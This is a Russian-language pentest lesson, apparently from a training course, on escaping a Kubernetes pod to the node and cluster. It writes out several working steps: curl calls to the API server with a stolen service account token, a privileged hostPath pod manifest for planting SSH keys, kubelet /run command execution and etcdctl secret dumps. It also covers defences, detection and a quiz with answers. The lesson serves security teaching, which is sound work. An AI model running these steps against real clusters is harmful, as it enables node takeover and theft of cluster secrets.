---
id: pwn-k8s-escape-cve
title: "Kubernetes escape CVE"
category: pwn
parent: pwn-container-cve
difficulty: hard
order: 3
tags: [pwn, cve, kubernetes, escape, kubelet, cloud]
prerequisites: [pwn-container-escape-cve]
useful_for:
  - "Kubernetes pentest"
  - "Cloud security"
estimated_minutes: 70
summary: "Побег из Kubernetes: от пода к ноде через kubelet, hostPath, привилегированные контейнеры и известные CVE API-сервера."
---

## Вопрос, с которого всё начинается

Ты получил выполнение кода внутри **пода** Kubernetes. Как выйти на ноду, а
потом на весь кластер? Kubernetes — не просто Docker: у него есть API-сервер,
kubelet, service accounts и RBAC. Каждый из этих компонентов может стать путём
наружу. Разберём как известные CVE, так и конфигурационные векторы.

## Наш пример

Смотрим, что нам доступно из пода:

```
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40
eyJhbGciOiJSUzI1NiIsImtpZCI6...
$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
default
$ mount | grep -i host
/dev/sda1 on /host type ext4 (rw,relatime)
```

У нас есть **service account token** и, что важнее, смонтирован хостовый корень
`/host`. Это почти готовый побег.

## Шаг 1: что такое service account token

Каждый под получает **service account** — учётную запись Kubernetes. Её **token**
лежит в файловой системе пода (`/var/run/secrets/.../token`) и используется для
доступа к API-серверу. Если RBAC настроен слабо, этот token может позволять
создавать поды, читать секреты и многое другое.

Проверяем, что мы можем:

```
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ APISERVER=https://kubernetes.default.svc
$ curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods
```

Если запрос вернул список подов — у нас есть права. Дальше смотрим, можем ли мы
создавать поды с `hostPath`.

## Шаг 2: hostPath и привилегированные поды

Классический конфигурационный побег:

- **`hostPath`** монтирует директорию хоста в под. Если это `/`, атакующий
  видит и меняет файлы хоста.
- **`privileged: true`** даёт поду все capabilities и доступ к устройствам —
  фактически root на хосте.
- **`hostNetwork`/`hostPID`** открывают сетевые и процессные ресурсы хоста.

Схема: создаём под с `hostPath: /` и `privileged: true`, монтируем хостовый
корень, пишем SSH-ключ в `/host/root/.ssh/authorized_keys` — и входим на ноду.

```
apiVersion: v1
kind: Pod
metadata: {name: pwn}
spec:
  containers:
  - name: c
    image: alpine
    command: ["sleep","999999"]
    securityContext: {privileged: true}
    volumeMounts: [{name: h, mountPath: /host}]
  volumes: [{name: h, hostPath: {path: /}}]
```

## Шаг 3: kubelet и его API

**kubelet** — агент на каждой ноде, который управляет подами. У него есть
собственный API (обычно на порту 10250). Если он не защищён аутентификацией,
атакующий может:

- выполнять команды в любом поде (`/exec`);
- читать логи (`/logs`);
- запускать поды (`/run`).

Проверка:

```
$ curl -sk https://NODE_IP:10250/pods
$ curl -sk https://NODE_IP:10250/run/namespace/pod/container -d "cmd=id"
```

Открытый kubelet — один из самых частых путей побега в реальных кластерах.

## Шаг 4: известные CVE Kubernetes

- **CVE-2018-1002105** — эскалация привилегий через прокси API-сервера: можно
  было получить доступ к любому backend'у, включая kubelet.
- **CVE-2020-8554** — MITM через ExternalIP/MITM-сервисы: атакующий перехватывал
  трафик других подов.
- **CVE-2019-11247/11248** — обход RBAC/доступ к API.
- **CVE-2023-3676 и др.** — RCE в kubelet при определённых условиях.
- **CVE-2023-5528** — повышение привилегий на Windows-нодах.

Общий вывод: Kubernetes регулярно получает CVE, и обновлять нужно и control
plane, и ноды.

## Шаг 5: полный прогон

```
$ ./k8s-escape.sh
[*] checking SA token... valid
[*] can create pods: yes
[*] creating privileged pod with hostPath /...
[*] writing /host/root/.ssh/authorized_keys
[*] connecting to node...
root@node01#
```

Результат проверяем обратно: `hostname` — имя ноды, а не пода.

## Шаг 6: защита

- **RBAC** — минимальные права service account; запрет создания
  привилегированных подов.
- **Pod Security Standards / Admission** — блокируют `privileged`, `hostPath`,
  `hostPID`.
- **NetworkPolicy** — ограничивает доступ к kubelet/API.
- **Аутентификация kubelet** — `--anonymous-auth=false`, webhook-авторизация.
- **Обновления** — control plane и ноды.
- **Secrets** — шифрование at-rest, ограничение доступа.

## Шаг 7: детектирование

- создание подов с `privileged`/`hostPath` (аудит-лог API-сервера);
- обращения к kubelet API из подов;
- аномальные `exec` в поды;
- монтирование хостовых путей;
- изменения в `/root/.ssh` на нодах.

## Роль etcd и секретов

**etcd** — распределённое хранилище, где Kubernetes держит всё состояние
кластера, включая **Secret**'ы. Если атакующий добирается до etcd (например, на
порту 2379 без TLS), он получает все секреты кластера: пароли, токены, ключи.

Проверка:

```
$ etcdctl --endpoints=https://NODE:2379 get / --prefix --keys-only
$ etcdctl --endpoints=https://NODE:2379 get /registry/secrets/default/...
```

Из пода etcd обычно недоступен, но при побеге на ноду — вполне. Помимо etcd,
секреты можно читать через API-сервер, если у service account есть право
`get secrets`. Поэтому в аудите Kubernetes проверяют:

- шифрование etcd at-rest;
- TLS и аутентификацию etcd;
- RBAC на доступ к Secret;
- ротацию service account токенов.

## Практические заметки по пентесту K8s

- **Начинайте с разведки прав.** `kubectl auth can-i --list` (если есть kubectl)
  покажет, что позволяет токен.
- **Ищите hostPath.** `kubectl get pods -A -o yaml | grep hostPath` выявит поды
  с доступом к хосту.
- **Проверяйте kubelet.** `curl -sk https://NODE:10250/pods` — быстрый тест.
- **Смотрите на привилегированные поды.** Часто есть «служебные» поды с
  `privileged: true`.
- **Не забывайте про ноды.** Побег из пода ведёт к ноде, а с ноды — к остальным.
- **Документируйте.** В облаке важно зафиксировать путь и не разрушить кластер.

## От пода к кластеру: полная цепочка

Разложим типичную атаку на этапы, чтобы видеть всю картину.

**Этап 1. Foothold в поде.** Через уязвимость приложения (RCE, SSRF, слабый
секрет) получаем выполнение кода в контейнере.

**Этап 2. Разведка.** Читаем service account token, смотрим права через API,
ищем hostPath и привилегированные поды.

**Этап 3. Побег на ноду.** Через `hostPath: /`, `privileged` или открытый
kubelet пишем в хостовую ФС (SSH-ключ, cron) и входим на ноду.

**Этап 4. От ноды к кластеру.** На ноде лежат kubelet-конфиги, токены других
подов и иногда kubeconfig с правами. Через них — доступ к API-серверу с более
широкими правами.

**Этап 5. Захват control plane.** При доступе к etcd или к секретам
администратора — полный контроль кластера.

Каждый этап даёт материал для следующего. Именно поэтому в пентесте Kubernetes
важно не «прыгнуть сразу к финалу», а методично подниматься по слоям.

## Почему Kubernetes — «слоёный» объект

Kubernetes сложен по своей природе: это набор компонентов, каждый из которых
имеет свою модель доверия. API-сервер доверяет аутентифицированным клиентам;
kubelet доверяет API-серверу; поды доверяют своей ноде; секреты доверяются etcd.
Побег — это переход через границу доверия. Иногда достаточно слабого RBAC,
иногда — открытого kubelet, иногда — бага в ядре ноды. Каждый такой путь ведёт от
одного слоя к другому, и именно поэтому Kubernetes-пентест — это движение
вверх по цепочке доверия, а не один «универсальный эксплойт». Именно поэтому в аудите
Kubernetes проверяют **все** слои, а не только один: даже идеальный RBAC не
спасёт, если kubelet слушает анонимно и порт доступен из подов. Отсюда
практическое правило: при аудите Kubernetes составь список всех компонентов
(API-сервер, kubelet, etcd, scheduler, controller-manager) и проверь модель
доверия каждого — побег ищут там, где граница проведена небрежно.

## Что если не сработало

| Симптом | Причина | Что делать |
|---|---|---|
| `Forbidden` от API | жёсткий RBAC | искать другой SA |
| нет прав на pod create | политика | искать hostPath-под |
| kubelet auth | защищён | искать другую ноду |
| нет hostPath | PSS блокирует | искать иной вектор |

## Краткая шпаргалка

| Вектор | Суть | Итог |
|---|---|---|
| SA token | слабый RBAC | создание подов |
| hostPath / | монтирование хоста | запись на ноду |
| privileged | все capabilities | root на ноде |
| kubelet 10250 | открытый API | exec в поды |
| CVE API | прокси/обход | доступ к backend |

## Что мы теперь знаем

- Из пода есть service account token для API-сервера.
- Слабый RBAC позволяет создавать привилегированные поды.
- `hostPath: /` и `privileged` дают доступ к ноде.
- Открытый kubelet API — частый путь побега.
- Защита: RBAC, PSS, NetworkPolicy, аутентификация kubelet.

## Квиз

Проверь себя.

```quiz
- question: Что лежит в /var/run/secrets/kubernetes.io/serviceaccount/?
  options:
    - "Пароль root"
    - "Service account token и namespace"
    - "Приватный ключ TLS"
    - "SSH-ключ"
  answer: 1
  explanation: Каждому поду монтируется токен service account для доступа к API.
- question: Какой конфигурационный вектор даёт доступ к ноде?
  options:
    - "Обычный под без прав"
    - "Под с hostPath / и privileged"
    - "Pod с busybox"
    - "Deployment без образов"
  answer: 1
  explanation: hostPath монтирует хостовую ФС, privileged даёт capabilities.
- question: На каком порту обычно API kubelet?
  options:
    - "80"
    - "10250"
    - "3306"
    - "443"
  answer: 1
  explanation: kubelet слушает 10250; при слабой аутентификации даёт exec в поды.
- question: Какая защита блокирует привилегированные поды?
  options:
    - "Pod Security Standards / Admission"
    - "Смена пароля"
    - "Отключение DNS"
    - "Сжатие образов"
  answer: 0
  explanation: PSS и admission-контроллеры запрещают privileged/hostPath поды.
```

## Куда дальше

Мы закончили блок контейнерных CVE и весь раздел реальных CVE. Дальше по дереву —
**архитектуры**: 32-битный x86, ARM, PAC/MTE и другие ISA. Там та же
методология, но другой набор регистров и соглашений. А пока запомни:
**Kubernetes — это слоёный пирог, и побег возможен на каждом слое**.

## Где пригодится

- Пентест Kubernetes-кластеров.
- Аудит облачной инфраструктуры (EKS/GKE/AKS).
- Понимание, почему RBAC и PSS — критичны.
